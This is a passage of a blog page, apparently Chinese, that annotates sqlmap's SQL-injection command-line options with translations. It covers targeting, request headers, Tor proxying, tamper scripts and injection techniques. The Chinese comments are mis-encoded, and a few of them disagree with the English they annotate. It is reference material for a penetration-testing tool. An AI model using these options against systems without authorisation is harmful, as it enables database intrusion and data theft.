class="comment">--url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span></span><br><span class="line"><span class="comment">## ç›®æ ‡URL</span></span><br><span class="line"></span><br><span class="line">-l LOGFILE Parse target(s) <span class="built_in">from</span> Burp <span class="keyword">or</span> WebScarab proxy <span class="built_in">log</span> <span class="built_in">file</span></span><br><span class="line"><span class="comment">## è§£æç›®æ ‡(s)ä»Burpæˆ–WebScarabä»£ç†æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">-x SITEMAPURL Parse target(s) <span class="built_in">from</span> remote sitemap(.xml) <span class="built_in">file</span></span><br><span class="line"><span class="comment">## è§£æç›®æ ‡(s)ä»è¿œç¨‹ç«™ç‚¹åœ°å›¾æ–‡ä»¶(.xml)</span></span><br><span class="line"></span><br><span class="line">-m BULKFILE Scan multiple targets given <span class="keyword">in</span> <span class="keyword">a</span> textual <span class="built_in">file</span></span><br><span class="line"><span class="comment">## æ‰«ææ–‡æœ¬æ–‡ä»¶ä¸­ç»™å‡ºçš„å¤šä¸ªç›®æ ‡</span></span><br><span class="line"></span><br><span class="line">-r REQUESTFILE Load HTTP request <span class="built_in">from</span> <span class="keyword">a</span> <span class="built_in">file</span></span><br><span class="line"><span class="comment">## ä»æœ¬åœ°æ–‡ä»¶åŠ è½½HTTPè¯·æ±‚ ï¼Œå¤šç”¨äºpostæ³¨å…¥ã€‚</span></span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK Process Google dork results <span class="keyword">as</span> target URLs</span><br><span class="line"><span class="comment">## å¤„ç†Googleçš„ç»“æœä½œä¸ºç›®æ ‡URLã€‚</span></span><br><span class="line"></span><br><span class="line">-c CONFIGFILE Load options <span class="built_in">from</span> <span class="keyword">a</span> configuration INI <span class="built_in">file</span></span><br><span class="line"><span class="comment">## ä»INIé…ç½®æ–‡ä»¶ä¸­åŠ è½½é€‰é¡¹ã€‚</span></span><br></pre></td></tr></table></figure><h3 id="Requestï¼ˆè¯·æ±‚ï¼‰"><a href="#Requestï¼ˆè¯·æ±‚ï¼‰" class="headerlink" title="Requestï¼ˆè¯·æ±‚ï¼‰"></a>Requestï¼ˆè¯·æ±‚ï¼‰</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">Requestï¼ˆè¯·æ±‚ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">These options can be used <span class="keyword">to</span> specify how <span class="keyword">to</span> connect <span class="keyword">to</span> the target URL</span><br><span class="line"><span class="comment">## è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šå¦‚ä½•è¿æ¥åˆ°ç›®æ ‡URLã€‚</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--method</span>=METHOD Force usage of given HTTP method (e.g. PUT)</span><br><span class="line"><span class="comment">## å¼ºåˆ¶ä½¿ç”¨ç»™å®šçš„HTTPæ–¹æ³•ï¼ˆe.g. PUTï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--data</span>=DATA Data string <span class="keyword">to</span> be sent through POST</span><br><span class="line"><span class="comment">## é€šè¿‡POSTå‘é€çš„æ•°æ®å­—ç¬¦ä¸²</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--param-del</span>=PARA.. Character used <span class="keyword">for</span> splitting parameter values</span><br><span class="line"><span class="comment">## ç”¨äºæ‹†åˆ†å‚æ•°å€¼çš„å­—ç¬¦</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--cookie</span>=COOKIE HTTP Cookie header value HTTP</span><br><span class="line"><span class="comment">## Cookieå¤´çš„å€¼</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--cookie-del</span>=COO.. Character used <span class="keyword">for</span> splitting cookie values</span><br><span class="line"><span class="comment">## ç”¨äºåˆ†å‰²Cookieå€¼çš„å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--load-cookies</span>=L.. File containing cookies <span class="keyword">in</span> Netscape/wget format</span><br><span class="line"><span class="comment">## åŒ…å«Netscape / wgetæ ¼å¼çš„cookieçš„æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">--drop-set-cookie Ignore Set-Cookie header <span class="keyword">from</span> response</span><br><span class="line"><span class="comment">## ä»å“åº”ä¸­å¿½ç•¥Set-Cookieå¤´</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--user-agent</span>=AGENT HTTP User-Agent header value</span><br><span class="line"><span class="comment">## æŒ‡å®š HTTP User - Agentå¤´</span></span><br><span class="line"></span><br><span class="line">--random-agent Use randomly selected HTTP User-Agent header value</span><br><span class="line"><span class="comment">##  ä½¿ç”¨éšæœºé€‰å®šçš„HTTP User - Agentå¤´</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--host</span>=HOST HTTP Host header value</span><br><span class="line"><span class="comment">## HTTPä¸»æœºå¤´å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--referer</span>=REFERER HTTP Referer header value</span><br><span class="line"><span class="comment">##  æŒ‡å®š HTTP Refererå¤´</span></span><br><span class="line"></span><br><span class="line">-H HEADER, --hea<span class="built_in">..</span> Extra header (e.g. <span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span>)</span><br><span class="line"><span class="comment">## é¢å¤–header</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--headers</span>=HEADERS Extra headers (e.g. <span class="string">&quot;Accept-Language: fr\\nETag: 123&quot;</span>)</span><br><span class="line"><span class="comment">## é¢å¤–header</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--auth-type</span>=AUTH.. HTTP authentication<span class="built_in"> type </span>(Basic, Digest, NTLM <span class="keyword">or</span> PKI)HTTP</span><br><span class="line"><span class="comment">## è®¤è¯ç±»å‹(Basic, Digest, NTLM or PKI)</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--auth-cred</span>=AUTH.. HTTP authentication credentials (name:password)</span><br><span class="line"><span class="comment">##  HTTPè®¤è¯å‡­è¯(name:password)</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--auth-file</span>=AUTH.. HTTP authentication PEM cert/private key file</span><br><span class="line"><span class="comment">## HTTPè®¤è¯ PEMè®¤è¯/ç§é’¥æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">--ignore-401 Ignore HTTP <span class="builtin-name">Error</span> 401 (Unauthorized)</span><br><span class="line"><span class="comment">## å¿½ç•¥HTTPé”™è¯¯401</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--proxy</span>=PROXY Use a<span class="built_in"> proxy </span><span class="keyword">to</span> connect <span class="keyword">to</span> the target URL</span><br><span class="line"><span class="comment">## ä½¿ç”¨ä»£ç†è¿æ¥åˆ°ç›®æ ‡ç½‘å€</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--proxy-cred</span>=PRO..<span class="built_in"> Proxy </span>authentication credentials (name:password)</span><br><span class="line"><span class="comment">## ä»£ç†è®¤è¯è¯ä¹¦(name:password)</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--proxy-file</span>=PRO.. Load<span class="built_in"> proxy </span>list <span class="keyword">from</span> a file</span><br><span class="line"><span class="comment">## ä»æ–‡ä»¶ä¸­åŠ è½½ä»£ç†åˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line">--ignore-proxy Ignore<span class="built_in"> system default proxy settings</span></span><br><span class="line"><span class="built_in"></span><span class="comment">## å¿½ç•¥ç³»ç»Ÿé»˜è®¤ä»£ç†è®¾ç½®</span></span><br><span class="line"></span><br><span class="line">--tor Use Tor anonymity<span class="built_in"> network</span></span><br><span class="line"><span class="built_in"></span><span class="comment">## ä½¿ç”¨ToråŒ¿åç½‘ç»œ</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--tor-port</span>=TORPORT <span class="builtin-name">Set</span> Tor<span class="built_in"> proxy port </span>other than<span class="built_in"> default</span></span><br><span class="line"><span class="built_in"></span><span class="comment">##  è®¾ç½®Torä»£ç†ç«¯å£è€Œä¸æ˜¯é»˜è®¤å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--tor-type</span>=TORTYPE <span class="builtin-name">Set</span> Tor<span class="built_in"> proxy type </span>(HTTP (default), SOCKS4 <span class="keyword">or</span> SOCKS5)</span><br><span class="line"><span class="comment">## è®¾ç½®Torä»£ç†ç±»å‹</span></span><br><span class="line"></span><br><span class="line">--check-tor Check <span class="keyword">to</span> see <span class="keyword">if</span> Tor is used properly</span><br><span class="line"><span class="comment">## æ£€æŸ¥Toræ˜¯å¦æ­£ç¡®ä½¿ç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--delay</span>=DELAY Delay <span class="keyword">in</span> seconds between each HTTP request</span><br><span class="line"><span class="comment">## æ¯ä¸ªHTTPè¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿï¼ˆç§’ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--timeout</span>=TIMEOUT Seconds <span class="keyword">to</span> wait before timeout<span class="built_in"> connection </span>(default 30)</span><br><span class="line"><span class="comment">## ç§’è¶…æ—¶è¿æ¥å‰ç­‰å¾…ï¼ˆé»˜è®¤30ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--retries</span>=RETRIES Retries when the<span class="built_in"> connection </span>timeouts (default 3)</span><br><span class="line"><span class="comment">##  è¿æ¥è¶…æ—¶æ—¶é‡è¯•ï¼ˆé»˜è®¤å€¼3ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--randomize</span>=RPARAM Randomly change value <span class="keyword">for</span> given parameter(s)</span><br><span class="line"><span class="comment">## éšæœºæ›´æ”¹ç»™å®šå‚æ•°çš„å€¼(s)</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--safe-url</span>=SAFEURL URL<span class="built_in"> address </span><span class="keyword">to</span> visit frequently during testing</span><br><span class="line"><span class="comment">## åœ¨æµ‹è¯•æœŸé—´é¢‘ç¹è®¿é—®çš„URLåœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--safe-post</span>=SAFE.. POST data <span class="keyword">to</span> send <span class="keyword">to</span> a safe URL</span><br><span class="line"><span class="comment">## POSTæ•°æ®å‘é€åˆ°å®‰å…¨URL</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--safe-req</span>=SAFER.. Load safe HTTP request <span class="keyword">from</span> a file</span><br><span class="line"><span class="comment">## ä»æ–‡ä»¶åŠ è½½å®‰å…¨HTTPè¯·æ±‚</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--safe-freq</span>=SAFE.. Test requests between two visits <span class="keyword">to</span> a given safe URL</span><br><span class="line"><span class="comment">## åœ¨ä¸¤æ¬¡è®¿é—®ç»™å®šå®‰å…¨ç½‘å€ä¹‹é—´æµ‹è¯•è¯·æ±‚</span></span><br><span class="line"></span><br><span class="line">--skip-urlencode Skip URL encoding of payload data</span><br><span class="line"><span class="comment">## è·³è¿‡æœ‰æ•ˆè½½è·æ•°æ®çš„URLç¼–ç </span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--csrf-token</span>=CSR.. Parameter used <span class="keyword">to</span> hold anti-CSRF token</span><br><span class="line"><span class="comment">## å‚æ•°ç”¨äºä¿å­˜anti-CSRFä»¤ç‰Œ</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--csrf-url</span>=CSRFURL URL<span class="built_in"> address </span><span class="keyword">to</span> visit <span class="keyword">to</span> extract anti-CSRF token</span><br><span class="line"><span class="comment">## æå–anti-CSRF URLåœ°å€è®¿é—®ä»¤ç‰Œ</span></span><br><span class="line"></span><br><span class="line">--force-ssl Force usage of SSL/HTTPS</span><br><span class="line"><span class="comment">## å¼ºåˆ¶ä½¿ç”¨SSL /HTTPS</span></span><br><span class="line"></span><br><span class="line">--hpp Use HTTP parameter pollution method</span><br><span class="line"><span class="comment">## ä½¿ç”¨HTTPå‚æ•°pollutionçš„æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--eval</span>=EVALCODE Evaluate provided Python code before the request (e.g. è¯„ä¼°è¯·æ±‚ä¹‹å‰æä¾›Pythonä»£ç <span class="string">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Optimizationï¼ˆä¼˜åŒ–ï¼‰"><a href="#Optimizationï¼ˆä¼˜åŒ–ï¼‰" class="headerlink" title="Optimizationï¼ˆä¼˜åŒ–ï¼‰"></a>Optimizationï¼ˆä¼˜åŒ–ï¼‰</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Optimizationï¼ˆä¼˜åŒ–ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">These options can be used to optimize the performance of sqlmap</span><br><span class="line"><span class="meta">## è¿™äº›é€‰é¡¹å¯ç”¨äºä¼˜åŒ–sqlmapçš„æ€§èƒ½</span></span><br><span class="line">â€‹</span><br><span class="line">-o Turn on all optimization switches</span><br><span class="line"><span class="meta">## å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³</span></span><br><span class="line">â€‹</span><br><span class="line">--predict-output Predict common queries output</span><br><span class="line"><span class="meta">## é¢„æµ‹å¸¸è§çš„æŸ¥è¯¢è¾“å‡º</span></span><br><span class="line">â€‹</span><br><span class="line">--keep-alive Use persistent HTTP(s) connections</span><br><span class="line"><span class="meta">## ä½¿ç”¨æŒä¹…çš„HTTPï¼ˆSï¼‰è¿æ¥</span></span><br><span class="line">â€‹</span><br><span class="line">--<span class="literal">null</span>-connection Retrieve page length without actual HTTP response body</span><br><span class="line"><span class="meta">## ä»æ²¡æœ‰å®é™…çš„HTTPå“åº”ä½“ä¸­æ£€ç´¢é¡µé¢é•¿åº¦</span></span><br><span class="line">â€‹</span><br><span class="line">--threads=THREADS Max number of concurrent HTTP(s) requests (<span class="keyword">default</span> <span class="number">1</span>)</span><br><span class="line"><span class="meta">## æœ€å¤§çš„HTTPï¼ˆSï¼‰è¯·æ±‚å¹¶å‘é‡ï¼ˆé»˜è®¤ä¸º1ï¼‰</span></span><br></pre></td></tr></table></figure><h3 id="Injectionï¼ˆæ³¨å…¥ï¼‰"><a href="#Injectionï¼ˆæ³¨å…¥ï¼‰" class="headerlink" title="Injectionï¼ˆæ³¨å…¥ï¼‰"></a>Injectionï¼ˆæ³¨å…¥ï¼‰</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Injectionï¼ˆæ³¨å…¥ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">These options can be used <span class="keyword">to</span> specify which parameters <span class="keyword">to</span> test <span class="keyword">for</span>, provide custom injection payloads <span class="keyword">and</span> optional tampering scripts</span><br><span class="line"><span class="comment">##  è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šæµ‹è¯•å“ªäº›å‚æ•°ï¼Œ æä¾›è‡ªå®šä¹‰çš„æ³¨å…¥payloadså’Œå¯é€‰ç¯¡æ”¹è„šæœ¬ã€‚</span></span><br><span class="line">â€‹</span><br><span class="line">-p TESTPARAMETER Testable parameter(s)</span><br><span class="line"><span class="comment">## å¯æµ‹è¯•çš„å‚æ•°ï¼ˆSï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--skip</span>=SKIP Skip testing <span class="keyword">for</span> given parameter(s)</span><br><span class="line"><span class="comment">## è·³è¿‡å¯¹ç»™å®šå‚æ•°çš„æµ‹è¯•</span></span><br><span class="line">â€‹</span><br><span class="line">--skip-static Skip testing parameters that <span class="keyword">not</span> appear <span class="keyword">to</span> be dynamic</span><br><span class="line"><span class="comment">## è·³è¿‡æµ‹è¯•ä¸æ˜¾ç¤ºä¸ºåŠ¨æ€çš„å‚æ•°</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--param-exclude</span>=.. Regexp <span class="keyword">to</span> exclude parameters <span class="keyword">from</span> testing (e.g. <span class="string">&quot;ses&quot;</span>)</span><br><span class="line"><span class="comment">## ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ’é™¤å‚æ•°è¿›è¡Œæµ‹è¯•ï¼ˆe.g. &quot;ses&quot;ï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--dbms</span>=DBMS Force back-end DBMS <span class="keyword">to</span> this value</span><br><span class="line"><span class="comment">## å¼ºåˆ¶åç«¯çš„DBMSä¸ºæ­¤å€¼</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--dbms-cred</span>=DBMS.. DBMS authentication credentials (user:password)</span><br><span class="line"><span class="comment">## DBMSè®¤è¯å‡­è¯(user:password)</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--os</span>=OS Force back-end DBMS operating<span class="built_in"> system </span><span class="keyword">to</span> this value</span><br><span class="line"><span class="comment">## å¼ºåˆ¶åç«¯çš„DBMSæ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªå€¼</span></span><br><span class="line">â€‹</span><br><span class="line">--invalid-bignum Use big numbers <span class="keyword">for</span> invalidating values</span><br><span class="line"><span class="comment">## ä½¿ç”¨å¤§æ•°å­—ä½¿å€¼æ— æ•ˆ</span></span><br><span class="line">â€‹</span><br><span class="line">--invalid-logical Use logical operations <span class="keyword">for</span> invalidating values</span><br><span class="line"><span class="comment">## ä½¿ç”¨é€»è¾‘æ“ä½œä½¿å€¼æ— æ•ˆ</span></span><br><span class="line">â€‹</span><br><span class="line">--invalid-string Use random strings <span class="keyword">for</span> invalidating values</span><br><span class="line"><span class="comment">## ä½¿ç”¨éšæœºå­—ç¬¦ä¸²ä½¿å€¼æ— æ•ˆ</span></span><br><span class="line">â€‹</span><br><span class="line">--no-cast Turn off payload casting mechanism</span><br><span class="line"><span class="comment">## å…³é—­æœ‰æ•ˆè½½è·é“¸é€ æœºåˆ¶</span></span><br><span class="line">â€‹</span><br><span class="line">--no-escape Turn off string escaping mechanism</span><br><span class="line"><span class="comment">## å…³é—­å­—ç¬¦ä¸²è½¬ä¹‰æœºåˆ¶</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--prefix</span>=PREFIX Injection payload<span class="built_in"> prefix </span>string</span><br><span class="line"><span class="comment">## æ³¨å…¥payloadå­—ç¬¦ä¸²å‰ç¼€</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--suffix</span>=SUFFIX Injection payload suffix string</span><br><span class="line"><span class="comment">## æ³¨å…¥payloadå­—ç¬¦ä¸²åç¼€</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--tamper</span>=TAMPER Use given script(s) <span class="keyword">for</span> tampering injection data</span><br><span class="line"><span class="comment">## ä½¿ç”¨ç»™å®šçš„è„šæœ¬ï¼ˆSï¼‰ç¯¡æ”¹æ³¨å…¥æ•°æ®</span></span><br></pre></td></tr></table></figure><h3 id="Detectionï¼ˆæ£€æµ‹ï¼‰"><a href="#Detectionï¼ˆæ£€æµ‹ï¼‰" class="headerlink" title="Detectionï¼ˆæ£€æµ‹ï¼‰"></a>Detectionï¼ˆæ£€æµ‹ï¼‰</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Detectionï¼ˆæ£€æµ‹ï¼‰:</span><br><span class="line">These options can be used <span class="keyword">to</span> customize the detection phase</span><br><span class="line"><span class="comment">## è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šåœ¨SQLç›²æ³¨æ—¶å¦‚ä½•è§£æå’Œæ¯”è¾ƒHTTPå“åº”é¡µé¢çš„å†…å®¹ã€‚</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--level</span>=LEVEL Level of tests <span class="keyword">to</span> perform (1-5,<span class="built_in"> default </span>1)</span><br><span class="line"><span class="comment">## æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--risk</span>=RISK Risk of tests <span class="keyword">to</span> perform (1-3,<span class="built_in"> default </span>1)</span><br><span class="line"><span class="comment">## æ‰§è¡Œæµ‹è¯•çš„é£é™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º1ï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--string</span>=STRING String <span class="keyword">to</span> match when query is evaluated <span class="keyword">to</span> <span class="literal">True</span></span><br><span class="line"><span class="comment">##  æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…å­—ç¬¦ä¸²</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--not-string</span>=NOT.. String <span class="keyword">to</span> match when query is evaluated <span class="keyword">to</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">## å½“æŸ¥è¯¢æ±‚å€¼ä¸ºæ— æ•ˆæ—¶åŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--regexp</span>=REGEXP Regexp <span class="keyword">to</span> match when query is evaluated <span class="keyword">to</span> <span class="literal">True</span></span><br><span class="line"><span class="comment">## æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--code</span>=CODE HTTP code <span class="keyword">to</span> match when query is evaluated <span class="keyword">to</span> <span class="literal">True</span></span><br><span class="line"><span class="comment">## å½“æŸ¥è¯¢æ±‚å€¼ä¸ºTrueæ—¶åŒ¹é…çš„HTTPä»£ç </span></span><br><span class="line">â€‹</span><br><span class="line">--text-only Compare pages based only on the textual content</span><br><span class="line"><span class="comment">## ä»…åŸºäºåœ¨æ–‡æœ¬å†…å®¹æ¯”è¾ƒç½‘é¡µ</span></span><br><span class="line">â€‹</span><br><span class="line">--titles Compare pages based only on their titles</span><br><span class="line"><span class="comment">##  ä»…æ ¹æ®ä»–ä»¬çš„æ ‡é¢˜è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Techniquesï¼ˆæŠ€å·§ï¼‰"><a href="#Techniquesï¼ˆæŠ€å·§ï¼‰" class="headerlink" title="Techniquesï¼ˆæŠ€å·§ï¼‰"></a>Techniquesï¼ˆæŠ€å·§ï¼‰</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Techniquesï¼ˆæŠ€å·§ï¼‰:</span><br><span class="line">These options can be used <span class="keyword">to</span> tweak testing of specific SQL injection techniques</span><br><span class="line"><span class="comment">## è¿™äº›é€‰é¡¹å¯ç”¨äºè°ƒæ•´å…·ä½“çš„SQLæ³¨å…¥æµ‹è¯•ã€‚</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--technique</span>=TECH SQL injection techniques <span class="keyword">to</span> use (default <span class="string">&quot;BEUSTQ&quot;</span>)</span><br><span class="line"><span class="comment">## SQL æ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤BEUSTï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--time-sec</span>=TIMESEC Seconds <span class="keyword">to</span> delay the DBMS response (default 5)</span><br><span class="line"><span class="comment">##  DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’ï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--union-cols</span>=UCOLS Range of columns <span class="keyword">to</span> test <span class="keyword">for</span> UNION query SQL injection</span><br><span class="line"><span class="comment">##  å®šåˆ—èŒƒå›´ç”¨äºæµ‹è¯•UNIONæŸ¥è¯¢æ³¨å…¥</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--union-char</span>=UCHAR Character <span class="keyword">to</span> use <span class="keyword">for</span> bruteforcing number of columns</span><br><span class="line"><span class="comment">##  ç”¨äºæš´åŠ›çŒœè§£åˆ—æ•°çš„å­—ç¬¦</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--union-from</span>=UFROM Table <span class="keyword">to</span> use <span class="keyword">in</span> <span class="keyword">FROM</span> part of UNION query SQL injection</span><br><span class="line"><span class="comment">##  